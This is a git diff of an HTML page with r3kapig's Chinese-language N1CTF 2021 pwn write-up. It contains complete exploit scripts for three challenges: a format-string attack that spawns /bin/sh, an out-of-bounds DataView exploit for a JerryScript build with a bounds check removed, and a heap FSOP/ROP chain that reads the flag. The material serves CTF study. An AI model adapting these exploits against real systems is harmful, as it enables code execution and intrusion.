@@ -309,70 +309,70 @@
         <article class="markdown-body"><h1 id="n1ctf-2021-writeup"><a class="header-link" href="#n1ctf-2021-writeup"></a>N1CTF 2021 Writeup</h1>
 <p>本次比赛我们获得了第二名的成绩</p>
 <p class="img-container"><img src="https://i.imgur.com/DBz5XOb.png" alt=""></p>
-<p>现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：<a href="mailto:root@r3kapig.com">root@r3kapig.com</a></p>
+<p>现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：<a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#x72;&#x33;&#x6b;&#97;&#x70;&#x69;&#x67;&#x2e;&#99;&#x6f;&#109;">&#114;&#111;&#x6f;&#116;&#x40;&#x72;&#x33;&#x6b;&#97;&#x70;&#x69;&#x67;&#x2e;&#99;&#x6f;&#109;</a></p>
 <h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
 <h3 id="babyfmt"><a class="header-link" href="#babyfmt"></a>BabyFMT</h3>
 <p>修改了printf,和scanf。题目中有个fmtstr的漏洞，但是printf只剩下%r%m可以泄露，仔细看了下发现有个%\0的处理有问题会造成溢出所以泄露后把__free_hook链tache就可以getshell.</p>
 <pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-context.log_level=<span class="hljs-string">'debug'</span>
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span><span class="hljs-params">(c)</span>:</span>
-    p.sendlineafter(<span class="hljs-string">"&gt;"</span>,str(c).encode(<span class="hljs-string">'utf-8'</span>))
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,author=<span class="hljs-string">b"a"</span>,c=<span class="hljs-string">b'c'</span>)</span>:</span>
+context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span>(<span class="hljs-params">c</span>):</span>
+    p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(c).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,author=<span class="hljs-string">b&quot;a&quot;</span>,c=<span class="hljs-string">b&#x27;c&#x27;</span></span>):</span>
     cmd(<span class="hljs-number">1</span>)
-    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b"Content size is "</span>+str(size).encode(<span class="hljs-string">'utf-8'</span>))
-    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b"Book author is "</span>+author)
-    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b"Book content is "</span>+c)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">b&quot;Content size is &quot;</span>+<span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
+    p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">b&quot;Book author is &quot;</span>+author)
+    p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">b&quot;Book content is &quot;</span>+c)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span>
     cmd(<span class="hljs-number">2</span>)
-    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b'Book idx is '</span>+str(idx).encode(<span class="hljs-string">'utf-8'</span>))
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">puts</span><span class="hljs-params">(s,idx=<span class="hljs-number">0</span>)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">b&#x27;Book idx is &#x27;</span>+<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">puts</span>(<span class="hljs-params">s,idx=<span class="hljs-number">0</span></span>):</span>
     cmd(<span class="hljs-number">3</span>)
-    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b'Book idx is '</span>+str(idx).encode(<span class="hljs-string">'utf-8'</span>))
-    p.sendlineafter(<span class="hljs-string">"You can show book by yourself\n"</span>,<span class="hljs-string">b'My format '</span>+s)
+    p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">b&#x27;Book idx is &#x27;</span>+<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
+    p.sendlineafter(<span class="hljs-string">&quot;You can show book by yourself\n&quot;</span>,<span class="hljs-string">b&#x27;My format &#x27;</span>+s)
 
-p=remote(<span class="hljs-string">"43.155.72.106"</span>,<span class="hljs-number">9999</span>)
-<span class="hljs-comment">#p=process("./pwn")</span>
-<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):
+p=remote(<span class="hljs-string">&quot;43.155.72.106&quot;</span>,<span class="hljs-number">9999</span>)
+<span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span>
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):
     add(<span class="hljs-number">0x68</span>)
-<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):
     free(x)
 free(<span class="hljs-number">0</span>)
-<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
     add(<span class="hljs-number">0x68</span>)
 add(<span class="hljs-number">0x1</span>)
 
-puts(<span class="hljs-string">b"%r%m%r"</span>,<span class="hljs-number">7</span>)
-base=u64(p.read(<span class="hljs-number">6</span>)+<span class="hljs-string">b'\0\0'</span>)-(<span class="hljs-number">0x7ffff7facc61</span><span class="hljs-number">-0x7ffff7dc1000</span>)
-log.warning(hex(base))
+puts(<span class="hljs-string">b&quot;%r%m%r&quot;</span>,<span class="hljs-number">7</span>)
+base=u64(p.read(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\0\0&#x27;</span>)-(<span class="hljs-number">0x7ffff7facc61</span>-<span class="hljs-number">0x7ffff7dc1000</span>)
+log.warning(<span class="hljs-built_in">hex</span>(base))
 free(<span class="hljs-number">5</span>)
 
 free(<span class="hljs-number">6</span>)
-puts(<span class="hljs-string">b'%1%\0'</span>+<span class="hljs-string">b"\1"</span>*<span class="hljs-number">0x5e</span>+p64(<span class="hljs-number">0x1eeb28</span><span class="hljs-number">-0x10</span>+base))
+puts(<span class="hljs-string">b&#x27;%1%\0&#x27;</span>+<span class="hljs-string">b&quot;\1&quot;</span>*<span class="hljs-number">0x5e</span>+p64(<span class="hljs-number">0x1eeb28</span>-<span class="hljs-number">0x10</span>+base))
 
-<span class="hljs-comment">#puts(b'%\0'+b"\1"*0xb0+p64(0x1eeb28-0x10+base))</span>
+<span class="hljs-comment">#puts(b&#x27;%\0&#x27;+b&quot;\1&quot;*0xb0+p64(0x1eeb28-0x10+base))</span>
 add(<span class="hljs-number">0x68</span>)
 
-<span class="hljs-comment">#gdb.attach(p,'b *malloc')</span>
-puts(<span class="hljs-string">b"/bin/sh;%%%%%%%\x0011111"</span>+p64(<span class="hljs-number">0x55410</span>+base))
+<span class="hljs-comment">#gdb.attach(p,&#x27;b *malloc&#x27;)</span>
+puts(<span class="hljs-string">b&quot;/bin/sh;%%%%%%%\x0011111&quot;</span>+p64(<span class="hljs-number">0x55410</span>+base))
 p.interactive()</code></pre><h3 id="jerry"><a class="header-link" href="#jerry"></a>Jerry</h3>
 <p>通过 bindiff 比对，然后找到被修改的位置:</p>
 <pre class="hljs"><code>diff --git a<span class="hljs-regexp">/jerry-core/</span>ecma<span class="hljs-regexp">/operations/</span>ecma-dataview-object.c b<span class="hljs-regexp">/jerry-core/</span>ecma<span class="hljs-regexp">/operations/</span>ecma-dataview-object.c
 index <span class="hljs-number">45</span>db1e00..<span class="hljs-number">0</span>b4cac50 <span class="hljs-number">100644</span>
 --- a<span class="hljs-regexp">/jerry-core/</span>ecma<span class="hljs-regexp">/operations/</span>ecma-dataview-object.c
 +++ b<span class="hljs-regexp">/jerry-core/</span>ecma<span class="hljs-regexp">/operations/</span>ecma-dataview-object.c
-@@ -<span class="hljs-number">108</span>,<span class="hljs-number">10</span> +<span class="hljs-number">108</span>,<span class="hljs-number">10</span> @@ ecma_op_dataview_create (const ecma_value_t *arguments_list_p, <span class="hljs-comment">/**&lt; arguments li
+@@ -<span class="hljs-number">108</span>,<span class="hljs-number">10</span> +<span class="hljs-number">108</span>,<span class="hljs-number">10</span> @@ ecma_op_dataview_create (const ecma_value_t *arguments_list_p, /**&lt; arguments li
      }
-
-     /* 8.b */</span>
+ 
+     <span class="hljs-regexp">/* 8.b */</span>
 -    <span class="hljs-keyword">if</span> (offset + byte_length_to_index &gt; buffer_byte_length)
 -    {
--      <span class="hljs-keyword">return</span> ecma_raise_range_error (ECMA_ERR_MSG (<span class="hljs-string">"Start offset is outside the bounds of the buffer"</span>));
+-      return ecma_raise_range_error (ECMA_ERR_MSG (<span class="hljs-string">&quot;Start offset is outside the bounds of the buffer&quot;</span>));
 -    }
-+    <span class="hljs-comment">// if (offset + byte_length_to_index &gt; buffer_byte_length)</span>
-+    <span class="hljs-comment">// {</span>
-+    <span class="hljs-comment">//   return ecma_raise_range_error (ECMA_ERR_MSG ("Start offset is outside the bounds of the buffer"));</span>
-+    <span class="hljs-comment">// }</span>
-
++    <span class="hljs-regexp">//</span> <span class="hljs-keyword">if</span> (offset + byte_length_to_index &gt; buffer_byte_length)
++    <span class="hljs-regexp">//</span> {
++    <span class="hljs-regexp">//</span>   return ecma_raise_range_error (ECMA_ERR_MSG (<span class="hljs-string">&quot;Start offset is outside the bounds of the buffer&quot;</span>));
++    <span class="hljs-regexp">//</span> }
+ 
      JERRY_ASSERT (byte_length_to_index &lt;= UINT32_MAX);
      view_byte_length = (uint32_t) byte_length_to_index;</code></pre><p>删掉了一个 DataView 创建时的长度合法性检测，这意味着我们申请的 DataView 长度可以大于 ArrayBuffer，从而实现 oob。有了 oobArray 就很简单了，基本步骤：</p>
 <p>leak elf_base → leak got → leak libc → leak stack → hijack main_ret with one_gadget</p>
@@ -386,23 +386,23 @@ data2.setUint32(<span class="hljs-number">0</span>,<span class="hljs-number">0x4
 data2.setUint32(<span class="hljs-number">4</span>,<span class="hljs-number">0x42424242</span>)
 jerry_gloal_heap_offset=<span class="hljs-number">0x68</span>
 jerry_gloal_heap=data.getUint32(jerry_gloal_heap_offset+<span class="hljs-number">4</span>,<span class="hljs-literal">true</span>)*<span class="hljs-number">0x100000000</span>+data.getUint32(jerry_gloal_heap_offset,<span class="hljs-literal">true</span>)
-text_base=jerry_gloal_heap<span class="hljs-number">-0x6d480</span>
+text_base=jerry_gloal_heap-<span class="hljs-number">0x6d480</span>
 realloc_got=text_base+<span class="hljs-number">0x00000000006bf00</span>+<span class="hljs-number">0x10</span>
 print(jerry_gloal_heap.toString(<span class="hljs-number">16</span>))
 print(text_base.toString(<span class="hljs-number">16</span>))
 print(realloc_got.toString(<span class="hljs-number">16</span>))
 data.setUint32(jerry_gloal_heap_offset,realloc_got&amp;<span class="hljs-number">0xffffffff</span>,<span class="hljs-literal">true</span>)
 
-libc_base=data2.getUint32(<span class="hljs-number">4</span>,<span class="hljs-literal">true</span>)*<span class="hljs-number">0x100000000</span>+data2.getUint32(<span class="hljs-number">0</span>,<span class="hljs-literal">true</span>)<span class="hljs-number">-0x97b20</span>
+libc_base=data2.getUint32(<span class="hljs-number">4</span>,<span class="hljs-literal">true</span>)*<span class="hljs-number">0x100000000</span>+data2.getUint32(<span class="hljs-number">0</span>,<span class="hljs-literal">true</span>)-<span class="hljs-number">0x97b20</span>
 print(libc_base.toString(<span class="hljs-number">16</span>))
-env=libc_base+<span class="hljs-number">0x1e45a0</span><span class="hljs-number">-0x10</span>
+env=libc_base+<span class="hljs-number">0x1e45a0</span>-<span class="hljs-number">0x10</span>
 print(env.toString(<span class="hljs-number">16</span>))
 data.setUint32(jerry_gloal_heap_offset,env&amp;<span class="hljs-number">0xffffffff</span>,<span class="hljs-literal">true</span>)
 data.setUint32(jerry_gloal_heap_offset+<span class="hljs-number">4</span>,env/<span class="hljs-number">0x100000000</span>,<span class="hljs-literal">true</span>)
 
 stack=data2.getUint32(<span class="hljs-number">4</span>,<span class="hljs-literal">true</span>)*<span class="hljs-number">0x100000000</span>+data2.getUint32(<span class="hljs-number">0</span>,<span class="hljs-literal">true</span>)
 print(stack.toString(<span class="hljs-number">16</span>))
-ret_addr=stack<span class="hljs-number">-0x108</span><span class="hljs-number">-0x10</span>
+ret_addr=stack-<span class="hljs-number">0x108</span>-<span class="hljs-number">0x10</span>
 ogg=libc_base+[<span class="hljs-number">0xde78c</span>,<span class="hljs-number">0xde78f</span>,<span class="hljs-number">0xde792</span>][<span class="hljs-number">1</span>]
 data.setUint32(jerry_gloal_heap_offset,ret_addr&amp;<span class="hljs-number">0xffffffff</span>,<span class="hljs-literal">true</span>)
 data.setUint32(jerry_gloal_heap_offset+<span class="hljs-number">4</span>,ret_addr/<span class="hljs-number">0x100000000</span>,<span class="hljs-literal">true</span>)
@@ -410,150 +410,150 @@ data2.setUint32(<span class="hljs-number">0</span>,ogg&amp;<span class="hljs-num
 data2.setUint32(<span class="hljs-number">4</span>,ogg/<span class="hljs-number">0x100000000</span>,<span class="hljs-literal">true</span>)</code></pre><h3 id="house_of_tataru"><a class="header-link" href="#house_of_tataru"></a>House_of_tataru</h3>
 <p>菜单选项1不满足fail-safe的要求，可以随意修改大于0x1000的size。因为meta在heap上所以可以通过上面的那个漏洞读heap地址。然后bss上有几个freedchunk所以就可以先获得他们，之后猜一个bss和heap的偏移（最小1页最多0x2000页）然后就可以修改heap上的meta-&gt;mem，就可以通过选项1完成任意写。之后因为calloc还有exit里面都走了奇怪的分支把两个指针用任意写改掉，然后做FSOP+ROP就可以读flag，概率有点低是1/0x2000</p>
 <pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span><span class="hljs-params">(c)</span>:</span>
-    p.sendafter(<span class="hljs-string">":"</span>,str(c).encode(<span class="hljs-string">'utf-8'</span>))
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(magic=<span class="hljs-number">0xff</span>,idx=<span class="hljs-number">0</span>,c=<span class="hljs-string">b'A'</span>)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span>(<span class="hljs-params">c</span>):</span>
+    p.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(c).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">magic=<span class="hljs-number">0xff</span>,idx=<span class="hljs-number">0</span>,c=<span class="hljs-string">b&#x27;A&#x27;</span></span>):</span>
     cmd(<span class="hljs-number">1</span>)
     p.send(p32(magic))
     p.send(p8(idx))
     <span class="hljs-keyword">if</span>(magic&lt;<span class="hljs-number">0x1000</span>):
         p.send(c)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">(idx=<span class="hljs-number">0</span>)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span>(<span class="hljs-params">idx=<span class="hljs-number">0</span></span>):</span>
     cmd(<span class="hljs-number">2</span>)
     p.send(p8(idx))
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span><span class="hljs-params">(c,idx=<span class="hljs-number">0</span>)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">c,idx=<span class="hljs-number">0</span></span>):</span>
     cmd(<span class="hljs-number">3</span>)
     p.send(p8(idx))
     p.send(c)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx=<span class="hljs-number">0</span>)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx=<span class="hljs-number">0</span></span>):</span>
     cmd(<span class="hljs-number">4</span>)
     p.send(p8(idx))
 
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ddd</span><span class="hljs-params">()</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ddd</span>():</span>
     <span class="hljs-keyword">global</span> p
-    print(pidof(p))
+    <span class="hljs-built_in">print</span>(pidof(p))
     raw_input()
 <span class="hljs-keyword">import</span> os
 local=<span class="hljs-number">0</span>
 <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>):
     <span class="hljs-keyword">try</span>:
         <span class="hljs-keyword">if</span>(local):
-            p=process(<span class="hljs-string">b"/usr/sbin/chroot --userspec=1000:1000 /home/ctf ./pwn"</span>.split(<span class="hljs-string">b" "</span>))
+            p=process(<span class="hljs-string">b&quot;/usr/sbin/chroot --userspec=1000:1000 /home/ctf ./pwn&quot;</span>.split(<span class="hljs-string">b&quot; &quot;</span>))
         <span class="hljs-keyword">else</span>:
-            p=remote(<span class="hljs-string">"43.155.68.132"</span>,<span class="hljs-number">23333</span>,timeout=<span class="hljs-number">90</span>)
+            p=remote(<span class="hljs-string">&quot;43.155.68.132&quot;</span>,<span class="hljs-number">23333</span>,timeout=<span class="hljs-number">90</span>)
+        
+        context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;split&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]
+        add(<span class="hljs-number">0xfff</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;\1&quot;</span>)
+        add(<span class="hljs-number">0x888</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\2&#x27;</span>)
+        
 
-        context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
-        add(<span class="hljs-number">0xfff</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b"\1"</span>)
-        add(<span class="hljs-number">0x888</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b'\2'</span>)
-
-
-        add(<span class="hljs-number">0x1fd0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b'1'</span>)
+        add(<span class="hljs-number">0x1fd0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
         leave(<span class="hljs-number">1</span>)
         show(<span class="hljs-number">1</span>)
         p.read(<span class="hljs-number">0x30</span>)
-        heap=u64(p.read(<span class="hljs-number">6</span>)+<span class="hljs-string">b'\0\0'</span>)-(<span class="hljs-number">0x55e4fd7ef1a8</span><span class="hljs-number">-0x000055e4fd7ef000</span>)
-        log.warning(hex(heap))
-        context.log_level=<span class="hljs-string">'error'</span>
-
+        heap=u64(p.read(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\0\0&#x27;</span>)-(<span class="hljs-number">0x55e4fd7ef1a8</span>-<span class="hljs-number">0x000055e4fd7ef000</span>)
+        log.warning(<span class="hljs-built_in">hex</span>(heap))
+        context.log_level=<span class="hljs-string">&#x27;error&#x27;</span>
+        
 
         add(<span class="hljs-number">0x38</span>)<span class="hljs-comment"># </span>
 
 
         <span class="hljs-keyword">if</span>(local):
             pid=pidof(p)
-            pid = str(pid)[<span class="hljs-number">1</span>:<span class="hljs-number">-1</span>]
-            ccc=f<span class="hljs-string">"sed -n '5p' /proc/{pid}/maps"</span>
+            pid = <span class="hljs-built_in">str</span>(pid)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]
+            ccc=<span class="hljs-string">f&quot;sed -n &#x27;5p&#x27; /proc/<span class="hljs-subst">{pid}</span>/maps&quot;</span>
             res=os.popen(ccc).read()[:<span class="hljs-number">12</span>]
-            bss = int(<span class="hljs-string">"0x"</span>+res,<span class="hljs-number">16</span>)
-            log.warning(hex(bss))
+            bss = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;0x&quot;</span>+res,<span class="hljs-number">16</span>)
+            log.warning(<span class="hljs-built_in">hex</span>(bss))
         <span class="hljs-keyword">else</span>:
-            bss = heap<span class="hljs-number">-0x132000</span>
-
-        target = heap-bss <span class="hljs-number">-0xfa0</span>
+            bss = heap-<span class="hljs-number">0x132000</span>
+        
+        target = heap-bss -<span class="hljs-number">0xfa0</span>
         <span class="hljs-comment">#log.warning(hex(target))</span>
         add(target+<span class="hljs-number">0xf0</span>)
         leave()
-
+        
         show()
         p.read(<span class="hljs-number">0x30</span>)
-        base=u64(p.read(<span class="hljs-number">6</span>)+<span class="hljs-string">b'\0\0'</span>)-(<span class="hljs-number">0x7efd9dcd1040</span><span class="hljs-number">-0x00007efd9dc1a000</span>)
-
+        base=u64(p.read(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\0\0&#x27;</span>)-(<span class="hljs-number">0x7efd9dcd1040</span>-<span class="hljs-number">0x00007efd9dc1a000</span>)
+        
         <span class="hljs-keyword">if</span>(base&amp;<span class="hljs-number">0xfff</span>!=<span class="hljs-number">0</span>):
             exit(<span class="hljs-number">1</span>)
-        log.warning(hex(base))
-
+        log.warning(<span class="hljs-built_in">hex</span>(base))
+        
         <span class="hljs-comment">#AAR</span>
         <span class="hljs-comment">#add(0x80,1,p64(0xdeadbeef))</span>
-        FK = <span class="hljs-number">0x7f5a39a37f80</span><span class="hljs-number">-0x7f5a39981000</span>+base
-        log.warning(<span class="hljs-string">"Calloc Guard-&gt;"</span>+hex(FK))
+        FK = <span class="hljs-number">0x7f5a39a37f80</span>-<span class="hljs-number">0x7f5a39981000</span>+base
+        log.warning(<span class="hljs-string">&quot;Calloc Guard-&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(FK))
         add((<span class="hljs-number">0x140</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>),<span class="hljs-number">0</span>)
         leave()
         add((<span class="hljs-number">0x140</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>)+<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>)
-
-        read(p64(FK<span class="hljs-number">-0x30</span>))
+        
+        read(p64(FK-<span class="hljs-number">0x30</span>))
         add(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>))
-
+        
         <span class="hljs-comment"># add(0xc0,1,p64(0xdeadbeef))#locate</span>
-
-        GUARD = <span class="hljs-number">0x7fd7b6e3af20</span><span class="hljs-number">-0x7fd7b6d84000</span>+base<span class="hljs-comment"># exit guard</span>
-        context.log_level=<span class="hljs-string">'debug'</span>
-        log.warning(<span class="hljs-string">"Exit Guard-&gt;"</span>+hex(GUARD))
+        
+        GUARD = <span class="hljs-number">0x7fd7b6e3af20</span>-<span class="hljs-number">0x7fd7b6d84000</span>+base<span class="hljs-comment"># exit guard</span>
+        context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span>
+        log.warning(<span class="hljs-string">&quot;Exit Guard-&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(GUARD))
         add((<span class="hljs-number">0x168</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>),<span class="hljs-number">0</span>)
         leave()
         add((<span class="hljs-number">0x168</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>)+<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>)
-        read(p64(GUARD<span class="hljs-number">-0x30</span>))
+        read(p64(GUARD-<span class="hljs-number">0x30</span>))
 
 
-        add(<span class="hljs-number">0xb0</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b'\0'</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)*<span class="hljs-number">3</span>)
+        add(<span class="hljs-number">0xb0</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)*<span class="hljs-number">3</span>)
 <span class="hljs-comment">#        add(0xd0,1,p64(0xdeadbeef))# locate</span>
 
-        context.arch=<span class="hljs-string">'amd64'</span>
+        context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span>
         rdx = <span class="hljs-number">0x000000000002cdae</span>+base
         rdi = <span class="hljs-number">0x00000000000152a1</span>+base
         rsi = <span class="hljs-number">0x000000000007897d</span>+base <span class="hljs-comment"># rbp</span>
         rax = <span class="hljs-number">0x0000000000016a96</span>+base
         leaver = <span class="hljs-number">0x000000000007b088</span>+base
-        sys_read = <span class="hljs-number">0x7f2ea1052f10</span><span class="hljs-number">-0x7f2ea0fde000</span>+base
-        sys_open = <span class="hljs-number">0x7f2ea0ffda70</span><span class="hljs-number">-0x7f2ea0fde000</span>+base
-        sys_write = <span class="hljs-number">0x7f2ea1053700</span><span class="hljs-number">-0x7f2ea0fde000</span>+base
-        rebase = <span class="hljs-number">0x7f2ea10923f8</span><span class="hljs-number">-0x7f2ea0fde000</span>+base
+        sys_read = <span class="hljs-number">0x7f2ea1052f10</span>-<span class="hljs-number">0x7f2ea0fde000</span>+base
+        sys_open = <span class="hljs-number">0x7f2ea0ffda70</span>-<span class="hljs-number">0x7f2ea0fde000</span>+base
+        sys_write = <span class="hljs-number">0x7f2ea1053700</span>-<span class="hljs-number">0x7f2ea0fde000</span>+base
+        rebase = <span class="hljs-number">0x7f2ea10923f8</span>-<span class="hljs-number">0x7f2ea0fde000</span>+base
         syscall = <span class="hljs-number">0x7b3f6</span>+base
         payload = flat([
             <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,
             <span class="hljs-number">0xdeadbeef</span>,
             <span class="hljs-number">0x0000000000016e7e</span>+base,
             <span class="hljs-number">0xb43c0</span>+base,
-            <span class="hljs-number">0xb43c0</span>+base<span class="hljs-number">-0x40</span>,
+            <span class="hljs-number">0xb43c0</span>+base-<span class="hljs-number">0x40</span>,
             <span class="hljs-number">0xdeadbeef</span>,
             rsi,
             rebase,leaver,rdi,<span class="hljs-number">0</span>,rdx,<span class="hljs-number">0x1000</span>,sys_read,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0xffffffffffffffff</span>
         ])
         FSOP = <span class="hljs-number">0xb43a0</span>+base
-        log.warning(<span class="hljs-string">"FSOP-&gt;"</span>+hex(FSOP))
+        log.warning(<span class="hljs-string">&quot;FSOP-&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(FSOP))
         add((<span class="hljs-number">0xa0</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>),<span class="hljs-number">0</span>)
         leave()
         add((<span class="hljs-number">0xa0</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>)+<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>)
-        read(p64(FSOP<span class="hljs-number">-0x30</span>))
-
+        read(p64(FSOP-<span class="hljs-number">0x30</span>))
+        
         add(<span class="hljs-number">0xd0</span>,<span class="hljs-number">1</span>,payload)
         <span class="hljs-comment">#ddd()</span>
-
+        
         cmd(<span class="hljs-number">5</span>)
         rop=flat([
         rdi,rebase+<span class="hljs-number">0x199</span>,rsi,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,rdx,<span class="hljs-number">0</span>,rax,<span class="hljs-number">2</span>,syscall,
         rdi,<span class="hljs-number">3</span>,rsi,rebase,<span class="hljs-number">0</span>,rdx,<span class="hljs-number">0x99</span>,sys_read,
         rdi,<span class="hljs-number">1</span>,rsi,rebase,<span class="hljs-number">0</span>,rdx,<span class="hljs-number">0x99</span>,sys_write
         ])
-        p.send(rop.ljust(<span class="hljs-number">0x199</span>,<span class="hljs-string">b'\0'</span>)+<span class="hljs-string">b"./flag\0"</span>)
-
-        t=p.readuntil(<span class="hljs-string">b"\n"</span>)
+        p.send(rop.ljust(<span class="hljs-number">0x199</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)+<span class="hljs-string">b&quot;./flag\0&quot;</span>)
+        
+        t=p.readuntil(<span class="hljs-string">b&quot;\n&quot;</span>)
         res=p.read()
-        print(res)
-        log.warning(hex(base))
+        <span class="hljs-built_in">print</span>(res)
+        log.warning(<span class="hljs-built_in">hex</span>(base))
         raw_input()
-
-        <span class="hljs-comment">#gdb.attach(p,'vmmap')</span>
+        
+        <span class="hljs-comment">#gdb.attach(p,&#x27;vmmap&#x27;)</span>
         p.interactive()
     <span class="hljs-keyword">except</span> Exception:
         p.close()</code></pre><p>爆出来了 属于是欧皇的胜利了</p>
@@ -580,41 +580,41 @@ local=<span class="hljs-number">0</span>
